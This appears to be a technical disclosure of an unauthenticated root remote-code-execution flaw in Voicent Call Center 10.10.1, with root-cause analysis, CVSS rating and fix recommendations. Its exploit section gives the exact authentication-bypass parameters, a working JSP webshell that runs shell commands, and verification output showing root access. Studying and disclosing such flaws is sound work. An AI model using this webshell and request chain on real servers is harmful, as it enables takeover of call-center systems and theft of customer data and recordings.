# Voicent Call Center SaveFileServlet Unauthenticated Root RCE - Technical Analysis

## 1. Overview

Voicent Call Center Suite 10.10.1 is a call center software suite used by contact centers for call routing, IVR, and call recording; it embeds a Tomcat server on port 8155. The shipped `web.xml` has zero security-constraints, zero filters, and zero login-config, so there is no container-level authentication. The `SaveFileServlet` (`vx/server/servlet/SaveFileServlet.java`) exposes a file-write sink reachable through `/savefile.jsp`. An authentication bypass (the `forwardpage` parameter containing `/vmailhome.jsp?` short-circuits `checkAuth`, a config-independent code-level flaw) combined with an arbitrary file write into the webapp root lets an unauthenticated attacker deploy a JSP webshell and execute arbitrary commands as the Tomcat process user, which defaults to `root`.

## 2. Vulnerability Summary

- **Root cause**: (1) `forwardpage` parameter bypasses authentication at the code level; (2) `target` parameter controls the file write location without adequate restriction
- **CWE**: CWE-306 (missing authentication), CWE-22 (path traversal), CWE-434 (unrestricted upload), CWE-78 / CWE-94 (command / code injection)
- **CVSS 3.1**: 9.8 Critical — `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H`
- **Impact**: unauthenticated root RCE on the call center server

## 3. Authentication Boundary

Authentication is handled per-request inside the servlet via `VxApp.checkAuth` -> `checkVgateAuth0` (VxApp.java:794-799):

```java
if (httpSession == null && (serverPassword_ == null || serverPassword_.length() == 0)) return true;  // CWE-306 empty password
if (isLocalhost(remoteHost)) return true;  // CWE-285
```

On a fresh install / tomcatOnly state, `serverPassword_` is empty, so `checkAuth` returns true. Independently, `SaveFileServlet` contains a config-independent short-circuit:

```java
if (!(string5 != null && string5.contains("/vmailhome.jsp?") || VxApp.checkAuth(...))) {
    object4 = "ERROR: " + object3;   // blocked
} else {
    // file write proceeds
}
```

Sending `forwardpage=/vmailhome.jsp?x` makes the first disjunct true, bypassing `checkAuth` entirely regardless of server password configuration.

## 4. Attack Surface

| Item | Value |
|---|---|
| Port | 8155 (embedded Tomcat) |
| Entry point | `POST /savefile.jsp` (multipart) |
| Auth | none (web.xml zero security config) |
| Process user | root (default) |

The savefile servlet is part of the call-center web application (vx web), which is typically reachable from the operator network and, in many deployments, from the public Internet for remote-agent access. The servlet path `/savefile.jsp` is mapped in the shipped web.xml with no security constraint, and no filter performs authentication at the container level.

## 5. Sink Identification

`SaveFileServlet.service()` multipart branch:

```java
file2 = new File(file, string2 != null ? string2 : string3);  // uploaded file
object2 = VxApp.resolvePath(string);   // string = target param
File file3 = new File((String)object2);
...
M8Utils.copyFile(file2, file4, ...);   // file4 = resolved target (webroot)
```

The write location is decided by the `target` parameter through `resolvePath`; writing a JSP to the webroot lets Tomcat's JspServlet compile and execute it.

## 6. Source Identification

- `target` parameter (multipart NVPair `target` or query param) -> `string.replace('\\','/')` -> `resolvePath(string)`
- `forwardpage` parameter -> authentication short-circuit
- Uploaded file content = multipart file part (value flows into `string3`)

`VxApp.resolvePath` (VxApp.java:2214) for `target=shell.jsp`:

```java
int n = string.lastIndexOf("/");  // -1
Context context = tc_.getHost().findChild("");   // ROOT context
String string5 = context.getRealPath("");         // <home>/webapps/ROOT
File file = new File(string5, string4 + "/" + string3);  // webapps/ROOT/shell.jsp
// canonical startsWith(string5) TRUE -> return
```

Three independent input paths are combined in the exploit: `forwardpage` (authentication short-circuit), `target` (write destination), and the multipart file part (JSP content). The `target` value passes through `resolvePath`, which resolves the path against the ROOT web context and performs a canonical `startsWith` check against the webapp root — meaning the write must land inside the webapp root. That is precisely the location where Tomcat's JSP servlet will compile and execute the uploaded content, so the containment check does not mitigate the code-execution impact. The file part content is written verbatim to the resolved target.

## 7. Data Flow

```
POST /savefile.jsp multipart:
  forwardpage=/vmailhome.jsp?x  -> string5 (auth bypass)
  target=shell.jsp              -> string -> resolvePath
  file part (JSP content)       -> string3 -> file2 (uploaded)
    -> checkAuth bypassed (forwardpage short-circuit || empty serverPassword_)
    -> resolvePath("shell.jsp") -> <home>/webapps/ROOT/shell.jsp
    -> copyFile(uploaded JSP -> webapps/ROOT/shell.jsp)
    -> GET /shell.jsp?cmd=id -> Tomcat JspServlet compiles/executes -> Runtime.exec -> uid=0(root)
```

## 8. Exploit Construction

1. Build a multipart POST to `/savefile.jsp` with:
   - `forwardpage=/vmailhome.jsp?x` (authentication bypass)
   - `target=shell.jsp` (webroot write)
   - file part = JSP webshell:

   ```jsp
   <%@ page import="java.io.*" %><%
   String cmd = request.getParameter("cmd");
   if (cmd != null) {
     Process p = Runtime.getRuntime().exec(new String[]{"/bin/sh","-c",cmd});
     BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));
     String line; while ((line=br.readLine())!=null) out.println(line);
   }
   %>
   ```
2. The servlet returns 302 (auth bypass + write succeeded).
3. `GET /shell.jsp?cmd=<command>` executes the command; output is returned in the response.

The request uses standard `multipart/form-data` encoding: the `forwardpage` and `target` fields are ordinary form fields, and the JSP payload is a file part whose field name is not a recognized parameter, so its value flows into `string3` and becomes the uploaded file content. The `forwardpage` value must contain the literal substring `/vmailhome.jsp?`; any query string after it satisfies the check. The empty default `serverPassword_` provides an independent bypass path — with no password configured, `checkAuth` returns true before the servlet-specific logic even runs.

## 9. Dynamic Verification

Verified dynamically on Voicent Call Center 10.10.1:

```
STEP1 POST /savefile.jsp (forwardpage=/vmailhome.jsp?x, target=shell.jsp, JSP part)
  -> HTTP 302 Found
STEP2 GET /shell.jsp?cmd=id
  -> HTTP 200, body: uid=0(root) gid=0(root) groups=0(root)
STEP3 GET /shell.jsp?cmd=whoami -> root
      GET /shell.jsp?cmd=hostname -> <hostname>
      GET /shell.jsp?cmd=head -1 /etc/passwd -> root:x:0:0:root:/root:/bin/bash
STEP4 GET /shell.jsp?cmd=echo <MARKER> > /tmp/<MARKER>
  -> marker SSH read-back: owner root:root, content matches (fresh unique marker)
```

## 10. Reachability & Impact

- **Unauthenticated reachability**: `forwardpage` short-circuit is config-independent (works under any server password configuration); empty `serverPassword_` is the default fresh-install state.
- **Remote reachability**: port 8155 is exposed by default in production (research environment restricted to loopback only).
- **Default configuration**: shipped web.xml has zero security constraints; the code-level bypass and empty default password make the chain reachable out of the box.
- **Impact**: unauthenticated root RCE; full control of the call center server, call recordings, and customer data.

Voicent Call Center Suite is deployed in contact centers where the server handles call routing, IVR, and recording. Compromise of the server exposes call recordings, agent/customer data, and telephony control. The vulnerability is particularly notable because the code-level `forwardpage` bypass is independent of the server password setting: even an operator who configured a strong password remains vulnerable, since the short-circuit evaluates before `checkAuth` in the logical OR.

## 11. Fix Recommendations

1. Add security-constraints / filters to `web.xml` to enforce authentication at the container level.
2. Remove the `forwardpage` short-circuit in `SaveFileServlet`; always require `checkAuth`.
3. Restrict `target` to a dedicated non-webroot upload directory and enforce an extension allowlist (deny `.jsp`).
4. Force a non-empty `serverPassword_` at install time.
5. Disable JSP execution in webroot if not required.

## 12. CWE / CVSS

- **CWE-306** — missing authentication
- **CWE-22** — path traversal
- **CWE-434** — unrestricted file upload
- **CWE-78 / CWE-94** — command / code injection
- **CVSS 3.1**: **9.8 Critical** — `AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H`

The Scope change (S:C) reflects that the vulnerability crosses from the web application context into the host operating system (root shell), and all three impact metrics are High because the resulting code execution is unconstrained.
